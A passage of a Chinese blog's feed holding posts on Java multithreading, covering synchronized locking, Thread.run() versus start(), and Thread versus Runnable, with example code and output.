    <content type="html"><![CDATA[<blockquote><p>这是我Java多线程的第四篇博文了。本来计划一天一更的，但是国庆假期，都浪去了，没坚持更新。今天主要讲讲在Java多线程中，synchronized是如何工作的。</p></blockquote><a id="more"></a><h1 id="synchronized-原理"><a href="#synchronized-原理" class="headerlink" title="synchronized 原理"></a>synchronized 原理</h1><p>在Java中，每一个对象有且仅有一个同步锁。即同步锁是依赖于对象而存在。</p><p>当我们调用某对象的synchronized方法时，就获取了该对象的同步锁。且不同线程对同步锁的访问是互斥的。</p><h1 id="synchronized-基本规则"><a href="#synchronized-基本规则" class="headerlink" title="synchronized 基本规则"></a>synchronized 基本规则</h1><p>synchronized 遵循以下三条规则：</p><ul><li><strong>一</strong>、当一个线程访问“某对象”的“synchronized方法”或者“synchronized代码块”时，其他线程对“该对象”的该“synchronized方法”或者“synchronized代码块”的访问将被阻塞。</li><li><strong>二</strong>、当一个线程访问“某对象”的“synchronized方法”或者“synchronized代码块”时，其他线程仍然可以访问“该对象”的非同步代码块。</li><li><strong>三</strong>、当一个线程访问“某对象”的“synchronized方法”或者“synchronized代码块”时，其他线程对“该对象”的其他的“synchronized方法”或者“synchronized代码块”的访问将被阻塞。</li></ul><h1 id="synchronized-的几种使用方法"><a href="#synchronized-的几种使用方法" class="headerlink" title="synchronized 的几种使用方法"></a>synchronized 的几种使用方法</h1><p>在Java中，synchronized 关键字是用来控制线程同步的，就是在多线程的环境下，控制 synchronized 代码段不被多个线程同时执行。synchronized 既可以加在一段代码上，也可以加在方法上。下面将仔细了解 synchronized 关键字的几种使用方法。</p><h2 id="synchronized-作用于实例方法"><a href="#synchronized-作用于实例方法" class="headerlink" title="synchronized 作用于实例方法"></a>synchronized 作用于实例方法</h2><p>synchronized 修饰实例方法，作用于当前实例加锁，进入同步代码前要获得当前实例的锁。</p><p>正确示列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class InstanceSync implements Runnable &#123;</span><br><span class="line"></span><br><span class="line">    static int i = 0;</span><br><span class="line"></span><br><span class="line">    public synchronized void syncCount() &#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void run() &#123;</span><br><span class="line">        for (int j = 0; j &lt; 100000; j++) &#123;</span><br><span class="line">            syncCount();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws InterruptedException &#123;</span><br><span class="line">        InstanceSync instance = new InstanceSync();</span><br><span class="line">        Thread t1 = new Thread(instance);</span><br><span class="line">        Thread t2 = new Thread(instance);</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t1.join();</span><br><span class="line">        t2.join();</span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">200000</span><br></pre></td></tr></table></figure><p>错误示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class InstanceSyncBad implements Runnable&#123;</span><br><span class="line"></span><br><span class="line">    static int i = 0;</span><br><span class="line"></span><br><span class="line">    public synchronized void syncCount() &#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void run() &#123;</span><br><span class="line">        for (int j = 0; j &lt; 100000; j++) &#123;</span><br><span class="line">            syncCount();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws InterruptedException &#123;</span><br><span class="line">        Thread t1 = new Thread(new InstanceSyncBad());</span><br><span class="line">        Thread t2 = new Thread(new InstanceSyncBad());</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t1.join();</span><br><span class="line">        t2.join();</span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">175000</span><br></pre></td></tr></table></figure><p><strong>代码分析</strong> ：上面两个例子中，第一个获得了我们预期结果，第二个未获得预期结果。说明在第二个例子中 synchronized 方法出现了问题，因为第二个例子中， t1 和 t2 锁住的不是同一个对象。在t1、t2中变量是不共享的。解决这个问题的办法是，让 synchronized 锁住 静态方法。</p><p><strong>实例锁</strong>：锁在某一个实例对象上。如果该类是单例，那么该锁也具有全局锁的概念。实例锁对应的就是synchronized关键字。（即修饰实例方法的锁）</p><h2 id="synchronized-作用于静态方法"><a href="#synchronized-作用于静态方法" class="headerlink" title="synchronized 作用于静态方法"></a>synchronized 作用于静态方法</h2><p>synchronized 修饰静态方法，作用于当前类对象加锁，进入同步代码前要获得当前类对象的锁。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public class StaticSync implements Runnable &#123;</span><br><span class="line"></span><br><span class="line">    static int i=0;</span><br><span class="line"></span><br><span class="line">    public static synchronized void increase()&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void run() &#123;</span><br><span class="line">        for(int j=0;j&lt;100000;j++)&#123;</span><br><span class="line">            increase();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws InterruptedException &#123;</span><br><span class="line">        // 新实例</span><br><span class="line">        Thread t1=new Thread(new StaticSync());</span><br><span class="line">        Thread t2=new Thread(new StaticSync());</span><br><span class="line"></span><br><span class="line">        // 启动线程</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line"></span><br><span class="line">        t1.join();</span><br><span class="line">        t2.join();</span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">200000</span><br></pre></td></tr></table></figure><p><strong>代码分析</strong>：该实例中，synchronized 锁住的是静态方法，与锁住实例方法不一样。锁住静态方法，就相当于锁住整个类。</p><p><strong>全局锁</strong>：该锁针对的是类，无论实例多少个对象，那么线程都共享该锁。全局锁对应的就是static synchronized（或者是锁在该类的class或者classloader对象上）（即修饰静态方法的锁）。</p><h2 id="synchronized-作用于代码块"><a href="#synchronized-作用于代码块" class="headerlink" title="synchronized 作用于代码块"></a>synchronized 作用于代码块</h2><p>synchronized 修饰代码块，指定加锁对象，对给定对象加锁，进入同步代码库前要获得给定对象的锁。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class BlockSync implements Runnable &#123;</span><br><span class="line"></span><br><span class="line">    static BlockSync instance = new BlockSync();</span><br><span class="line">    static int i = 0;</span><br><span class="line"></span><br><span class="line">    public void run() &#123;</span><br><span class="line">        //使用同步代码块对变量i进行同步操作,锁对象为instance</span><br><span class="line">        synchronized (instance) &#123;</span><br><span class="line">            for (int j = 0; j &lt; 100000; j++) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws InterruptedException &#123;</span><br><span class="line">        Thread t1 = new Thread(instance);</span><br><span class="line">        Thread t2 = new Thread(instance);</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t1.join();</span><br><span class="line">        t2.join();</span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">200000</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;这是我Java多线程的第四篇博文了。本来计划一天一更的，但是国庆假期，都浪去了，没坚持更新。今天主要讲讲在Java多线程中，synchronized是如何工作的。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Java多线程" scheme="https://blog.weechang.xyz/categories/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
    
      <category term="Java多线程" scheme="https://blog.weechang.xyz/tags/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="Java" scheme="https://blog.weechang.xyz/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>【Java学习之从头开始】Java多线程-2——Thread中run()和start()的区别</title>
    <link href="https://blog.weechang.xyz/2018/10/02/java-thread-02-run-start/"/>
    <id>https://blog.weechang.xyz/2018/10/02/java-thread-02-run-start/</id>
    <published>2018-10-02T10:12:03.000Z</published>
    <updated>2018-10-08T02:48:56.974Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前一篇博文中，我们讨论了Java中多线程的常用实现方式及Thread和Runnable的区别。在本篇，我们将讨论Thread中run()和start()的区别。</p></blockquote><a id="more"></a><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>下面我们将通过代码来实现，两者的调用。并展示两者区别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class RunAndStart &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        MyThread myThread = new MyThread(&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;*** myThread run method&quot;);</span><br><span class="line">        myThread.run();</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;*** myThread start method&quot;);</span><br><span class="line">        myThread.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyThread extends Thread&#123;</span><br><span class="line"></span><br><span class="line">    public MyThread(String name)&#123;</span><br><span class="line">        super(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void run()&#123;</span><br><span class="line">        System.out.println(&quot;my name is &quot; + Thread.currentThread().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*** myThread run method</span><br><span class="line">my name is main</span><br><span class="line">*** myThread start method</span><br><span class="line">my name is test</span><br></pre></td></tr></table></figure><p>对以上运行结果呢，我做一下解释：</p><ul><li>Thread.currentThread().getName()是用于获取“当前线程”的名称。</li><li>myThread.run()是在“主线程main()”中调用的，该run()方法直接运行在“主线程main()”上。</li><li>myThread.start()会启动“线程myThread”，“线程myThread”启动之后，会调用run()方法。</li></ul><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><p>从以上代码的运行结果我们可以看到run() 和 start() 的区别：</p><ul><li>start() : 它的作用是启动一个新线程，新线程会执行相应的run()方法。start()不能被重复调用（该处我没给出具体代码，感兴趣的同学可以自行验证）。</li><li>run() : run()就和普通的成员方法一样，直接调用的话会在当前线程中执行run()，而并不会启动新线程。且能多次重复调用。</li></ul><h1 id="源码实现"><a href="#源码实现" class="headerlink" title="源码实现"></a>源码实现</h1><ul><li>start()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public synchronized void start() &#123;</span><br><span class="line">    // 检查线程启动状态</span><br><span class="line">    // 如果不是就绪状态，则抛出异常</span><br><span class="line">    if (threadStatus != 0)</span><br><span class="line">        throw new IllegalThreadStateException();</span><br><span class="line"></span><br><span class="line">    // 将当前线程，加入group中</span><br><span class="line">    group.add(this);</span><br><span class="line"></span><br><span class="line">    boolean started = false;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 通过本地方法 start0 启动线程</span><br><span class="line">        start0();</span><br><span class="line">        started = true;</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (!started) &#123;</span><br><span class="line">                group.threadStartFailed(this);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Throwable ignore) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private native void start0();</span><br></pre></td></tr></table></figure><p>源码解释： 在调用start方法的时候，其实是通过本地方法start0() 来启动的。通过start0() 创建一个新的线程，且调用run()执行。</p><ul><li>run()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public void run() &#123;</span><br><span class="line">    if (target != null) &#123;</span><br><span class="line">        target.run()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码解析: 直接调用目标对象的 run() 方法，并不会创建新线程。</p><p><strong>PS：此章节内容相关源码已上传至<a href="https://github.com/weechang/java-zero/tree/master/p2-java-thread/src/main/java/io/github/weechang/java/thread/runAndStart" rel="external nofollow noopener noreferrer" target="_blank">GitHub</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;前一篇博文中，我们讨论了Java中多线程的常用实现方式及Thread和Runnable的区别。在本篇，我们将讨论Thread中run()和start()的区别。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Java多线程" scheme="https://blog.weechang.xyz/categories/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
    
      <category term="Java多线程" scheme="https://blog.weechang.xyz/tags/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
      <category term="Java" scheme="https://blog.weechang.xyz/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>【Java学习之从头开始】Java多线程-1——Java中如何实现多线程</title>
    <link href="https://blog.weechang.xyz/2018/10/01/java-thread-01-implements-thread/"/>
    <id>https://blog.weechang.xyz/2018/10/01/java-thread-01-implements-thread/</id>
    <published>2018-09-30T16:08:39.000Z</published>
    <updated>2018-10-08T02:48:56.974Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>上一节，学习了Java多线程的基本概念，接下来就要正式进入多线程的学了。首先学习的是，在Java中如何实现一个多线程。</p></blockquote><a id="more"></a><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Java中主要通过 <strong>Thread</strong> 和 <strong>Runnable</strong> 两种方式来实现多线程。另外通过JUC中的线程池也能实现线程，该方法暂时不在我的学习范围之内。</p><h1 id="关于-Thread-和-Runnable"><a href="#关于-Thread-和-Runnable" class="headerlink" title="关于 Thread 和 Runnable"></a>关于 Thread 和 Runnable</h1><ul><li>Runnable 是一个接口。其中只定义了一个 run() 方法。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@FunctionalInterface</span><br><span class="line">public interface Runnable &#123;</span><br><span class="line"></span><br><span class="line">    public abstract void run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Thread 是一个Java类。是通过实现Runnable而成。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public class Thread implements Runnable &#123;&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过实现Runnable接口来实现一个多线程。利用Thread方法，可以直接实现多线程。下面我们将通过具体的例子说明如何实现多线程。</p><h1 id="通过-Thread-实现多线程"><a href="#通过-Thread-实现多线程" class="headerlink" title="通过 Thread 实现多线程"></a>通过 Thread 实现多线程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public class ImplementThread &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ImplementThread implementThread = new ImplementThread();</span><br><span class="line">        implementThread.byThread();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 继承 Thread 方式</span><br><span class="line">     */</span><br><span class="line">    public void byThread()&#123;</span><br><span class="line">        MyThread t1 = new MyThread();</span><br><span class="line">        MyThread t2 = new MyThread();</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyThread extends Thread &#123;</span><br><span class="line">    private int count = 10;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        for (int i = 0; i &lt; 20; i++) &#123;</span><br><span class="line">            if (this.count &gt; 0) &#123;</span><br><span class="line">                System.out.println(this.getName() + &quot; 计数器：count&quot; + this.count--);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Thread-1 计数器：count10</span><br><span class="line">Thread-0 计数器：count10</span><br><span class="line">Thread-1 计数器：count9</span><br><span class="line">Thread-0 计数器：count9</span><br><span class="line">Thread-1 计数器：count8</span><br><span class="line">Thread-0 计数器：count8</span><br><span class="line">Thread-1 计数器：count7</span><br><span class="line">Thread-0 计数器：count7</span><br><span class="line">Thread-1 计数器：count6</span><br><span class="line">Thread-0 计数器：count6</span><br><span class="line">Thread-1 计数器：count5</span><br><span class="line">Thread-0 计数器：count5</span><br><span class="line">Thread-1 计数器：count4</span><br><span class="line">Thread-0 计数器：count4</span><br><span class="line">Thread-1 计数器：count3</span><br><span class="line">Thread-0 计数器：count3</span><br><span class="line">Thread-0 计数器：count2</span><br><span class="line">Thread-0 计数器：count1</span><br><span class="line">Thread-1 计数器：count2</span><br><span class="line">Thread-1 计数器：count1</span><br></pre></td></tr></table></figure><p>通Thread继承方式，我们发现。MyThread 继承自Thread 是一个自定义线程。在主线程main()中，创建并启动了2个子线程，这两个子线程分别计数10次。</p><h1 id="通过-Runnable-实现多线程"><a href="#通过-Runnable-实现多线程" class="headerlink" title="通过 Runnable 实现多线程"></a>通过 Runnable 实现多线程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public class ImplementThread &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ImplementThread implementThread = new ImplementThread();</span><br><span class="line">        implementThread.byRunnable();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 实现 Runnable方式</span><br><span class="line">     */</span><br><span class="line">    public void byRunnable()&#123;</span><br><span class="line">        MyRunnable myRunnable = new MyRunnable();</span><br><span class="line"></span><br><span class="line">        Thread t1 = new Thread(myRunnable);</span><br><span class="line">        Thread t2 = new Thread(myRunnable);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyRunnable implements Runnable&#123;</span><br><span class="line"></span><br><span class="line">    private int count = 10;</span><br><span class="line"></span><br><span class="line">    public void run() &#123;</span><br><span class="line">        for (int i = 0; i &lt; 20; i++) &#123;</span><br><span class="line">            if (this.count &gt; 0) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + &quot; 计数器：count&quot; + this.count--);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Thread-0 计数器：count10</span><br><span class="line">Thread-1 计数器：count9</span><br><span class="line">Thread-0 计数器：count8</span><br><span class="line">Thread-0 计数器：count6</span><br><span class="line">Thread-0 计数器：count5</span><br><span class="line">Thread-1 计数器：count7</span><br><span class="line">Thread-0 计数器：count4</span><br><span class="line">Thread-0 计数器：count2</span><br><span class="line">Thread-1 计数器：count3</span><br><span class="line">Thread-0 计数器：count1</span><br></pre></td></tr></table></figure><p>通过Runnable方式我们可以发现，主线程main()中虽然启动了2个线程。但是这2个线程一共计数10次。说明这两个线程是基于MyRunnable共享的。</p><h1 id="Thread-与-Runnable的异同"><a href="#Thread-与-Runnable的异同" class="headerlink" title="Thread 与 Runnable的异同"></a>Thread 与 Runnable的异同</h1><p><strong>相同点</strong>：都是一种多线程的实现方式。<br><strong>不同点</strong>：<br>1) Thread 是 类， Runnable 是接口；<br>2) “一个类只能有一个父类，但是却能实现多个接口”，因此Runnable具有更好的扩展性；<br>3) Runnable还可以用于“资源的共享”。即，多个线程都是基于某一个Runnable对象建立的，它们会共享Runnable对象上的资源。</p><p><strong>建议使用Runnable去实现多线程</strong></p><h1 id="关于Thread的补充"><a href="#关于Thread的补充" class="headerlink" title="关于Thread的补充"></a>关于Thread的补充</h1><p>在很多博客上看到说，Runnable 相较于 Tread 能够实现资源共享，没有一个好的解释。就我上面的例子而言。可以看出Thread 与 Runnable 的写法不同。有些人肯定会心存疑虑。<br>所以在此，我对 Thread 的 写法做另一种补充以证清白。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">public class ImplementThread &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ImplementThread implementThread = new ImplementThread();</span><br><span class="line">        implementThread.byThread2();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Thread 资源不共享的补充说明</span><br><span class="line">     */</span><br><span class="line">    public void byThread2()&#123;</span><br><span class="line">        MyThread myThread = new MyThread();</span><br><span class="line"></span><br><span class="line">        Thread t1 = new Thread(myThread);</span><br><span class="line">        Thread t2 = new Thread(myThread);</span><br><span class="line"></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyThread extends Thread &#123;</span><br><span class="line">    private int count = 10;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        for (int i = 0; i &lt; 20; i++) &#123;</span><br><span class="line">            if (this.count &gt; 0) &#123;</span><br><span class="line">                System.out.println(this.getName() + &quot; 计数器：count&quot; + this.count--);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过和 Runnable一样的启动方式启动Thread 多线程。</p><p>运行结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Thread-0 计数器：count10</span><br><span class="line">Thread-0 计数器：count9</span><br><span class="line">Thread-0 计数器：count8</span><br><span class="line">Thread-0 计数器：count6</span><br><span class="line">Thread-0 